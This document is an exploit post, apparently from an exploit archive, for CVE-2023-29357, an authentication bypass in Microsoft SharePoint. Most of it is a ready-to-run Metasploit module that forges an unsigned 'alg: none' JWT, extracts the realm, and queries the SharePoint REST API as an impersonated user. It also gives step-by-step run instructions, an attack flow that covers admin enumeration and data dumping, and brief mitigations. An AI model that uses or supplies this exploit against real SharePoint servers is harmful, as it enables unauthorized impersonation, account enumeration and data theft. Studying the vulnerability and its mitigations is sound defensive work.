@@ -1,0 +1,246 @@
+=============================================================================================================================================
+| # Title     : SharePoint Authentication Bypass                                                                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration                                                      |
+=============================================================================================================================================
+
+POC : 
+
+1. Summary :
+   a critical authentication bypass vulnerability in Microsoft SharePoint known as CVE‑2023‑29357. (https://packetstorm.news/files/id/207960/)
+   The flaw allows an attacker to craft an unsigned JWT token with "alg": "none" and impersonate any SharePoint user, 
+   including Site Administrators, without possessing valid credentials.
+   The vulnerability is dangerous because it exposes internal SharePoint APIs and may enable privilege escalation or full system compromise.
+
+
+-------------------------
+How to Run the Exploit
+-------------------------
+
+### **1. Save the script**
+
+Save the code as:
+
+    ~/.msf4/modules/auxiliary/sharepoint/cve_2023_29357.rb
+
+
+### **2. Start it from terminal**
+
+msfconsole
+use auxiliary/sharepoint/cve_2023_29357
+set RHOSTS https://target.com
+run
+
+-------------------------
+auxiliary               :
+-------------------------
+##
+# CVE‑2023‑29357 SharePoint Auth Bypass
+# by Indoushka 
+##
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'SharePoint Auth Bypass (CVE‑2023‑29357)',
+      'Description'    => %q{
+        This module exploits an authentication bypass in Microsoft SharePoint
+        (CVE‑2023‑29357) using a crafted JWT token with "alg":"none".
+      },
+      'Author'         => [
+        'Indoushka (Conversion to MSF)'
+      ],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', '2023-29357']
+      ]
+    ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, 'Base SharePoint URL', '/' ])
+      ]
+    )
+  end
+
+  def create_jwt(aud, client_id)
+    header = { alg: 'none' }
+    now = Time.now.to_i
+    payload = {
+      aud: aud,
+      iss: client_id,
+      nbf: now,
+      exp: now + 3600,
+      ver: "hashedprooftoken",
+      nameid: "#{client_id}@#{aud.split('@')[1]}",
+      endpointurl: "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
+      endpointurlLength: 1,
+      isloopback: true
+    }
+
+    encoded_header  = Rex::Text.encode_base64url(header.to_json)
+    encoded_payload = Rex::Text.encode_base64url(payload.to_json)
+
+    "#{encoded_header}.#{encoded_payload}.AAA"
+  end
+
+  def get_realm
+    res = send_request_cgi({
+      'method'  => 'GET',
+      'uri'     => normalize_uri(target_uri.path, "_api/web/siteusers"),
+      'headers' => { 'Authorization' => 'Bearer ' }
+    }, 3)
+
+    return nil unless res&.code == 401
+
+    auth = res.headers['WWW-Authenticate']
+    return nil unless auth
+
+    realm = auth[/realm=\"([^\"]+)\"/, 1]
+    realm
+  end
+
+  def run
+    client_id = "00000003-0000-0ff1-ce00-000000000000"
+    print_status("[*] Fetching realm…")
+
+    realm = get_realm
+
+    if realm.nil?
+      print_error("[-] Failed to extract realm")
+      return
+    end
+
+    print_good("[+] Realm: #{realm}")
+
+    aud = "#{client_id}@#{realm}"
+    jwt = create_jwt(aud, client_id)
+
+    print_status("[*] Trying authentication bypass…")
+
+    res = send_request_cgi({
+      'method'  => 'GET',
+      'uri'     => normalize_uri(target_uri.path, "_api/web/siteusers"),
+      'headers' => {
+        'Authorization' => "Bearer #{jwt}",
+        'X-PROOF_TOKEN' => jwt,
+        'Accept' => 'application/json'
+      }
+    }, 5)
+
+    if res && res.code == 200
+      print_good("[+] Authentication bypass success!")
+      if res.body
+        print_line(res.body)
+      end
+    else
+      print_error("[-] Bypass failed. HTTP #{res&.code}")
+    end
+  end
+end
+
+---------------------------------------------------------------------------------------------------------
+[ Technical Description ]
+---------------------------------------------------------------------------------------------------------
+
+• The attacker sends a request to:
+      https://TARGET/_api/web/siteusers
+  This forces SharePoint to respond with a 401 and expose the Realm value.
+
+• The Realm is extracted from the “WWW‑Authenticate” header:
+      Bearer realm="XXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+
+• The attacker forges a JWT token with:
+      { "alg": "none" }
+
+• The “aud” field is constructed as:
+      00000003-0000-0ff1-ce00-000000000000@REALM
+
+• The forged token is sent to SharePoint REST API endpoints.
+
+• SharePoint incorrectly validates the token and treats the attacker as an authenticated user.
+The following module performs:
+
+1. Realm extraction  
+2. Token forgery  
+3. Authentication bypass  
+4. Admin enumeration  
+5. Privilege validation  
+
+Core logic excerpt (Metasploit Ruby):
+
+    jwt_header = { alg: "none" }.to_json
+    jwt_payload = {
+        aud: "#{client_id}@#{realm}",
+        iss: client_id,
+        nbf: Time.now.to_i,
+        exp: Time.now.to_i + 3600,
+        ver: "hashedprooftoken",
+        nameid: "#{client_id}@#{realm}",
+        endpointurl: "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
+        endpointurlLength: 1,
+        isloopback: true
+    }.to_json
+
+    unsigned_token = "#{b64(jwt_header)}.#{b64(jwt_payload)}.AAA"
+
+    send_request_cgi({
+      'method'  => 'GET',
+      'uri'     => normalize_uri('_api', 'web', 'currentuser'),
+      'headers' => {
+          "Authorization" => "Bearer #{unsigned_token}",
+          "X-PROOF_TOKEN" => unsigned_token
+      }
+    })
+
+---------------------------------------------------------------------------------------------------------
+[ Attack Flow ]
+---------------------------------------------------------------------------------------------------------
+
+1. Force 401 → Extract Realm  
+2. Build forged JWT  
+3. Bypass authentication  
+4. Enumerate site admins  
+5. Optional: Impersonate admin (SharePoint accepts spoofing)  
+6. Dump internal API data  
+
+---------------------------------------------------------------------------------------------------------
+[ Impact ]
+---------------------------------------------------------------------------------------------------------
+
+✔ Full user enumeration  
+✔ Admin identification  
+✔ Access to restricted SharePoint API routes  
+✔ Potential privilege escalation  
+✔ Ability to chain with RCE vulnerabilities (CVE‑2023‑24955)  
+✔ Data leakage (lists, documents, users, groups…)  
+
+Severity: **CRITICAL**
+
+---------------------------------------------------------------------------------------------------------
+[ Mitigation ]
+---------------------------------------------------------------------------------------------------------
+
+• Install the official Microsoft patch  
+• Enforce strict JWT signature verification  
+• Reject any token with "alg:none"  
+• Disable loopback trust token mode  
+• Monitor ULS logs for abnormal access patterns  
+
+---------------------------------------------------------------------------------------------------------
+[ Conclusion ]
+---------------------------------------------------------------------------------------------------------
+
+CVE‑2023‑29357 is a severe authentication bypass allowing attackers to impersonate
+any SharePoint user without credentials.  
+The vulnerability is trivial to exploit and provides high‑value access to internal
+SharePoint data and admin functions.
+
+Patch immediately.
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
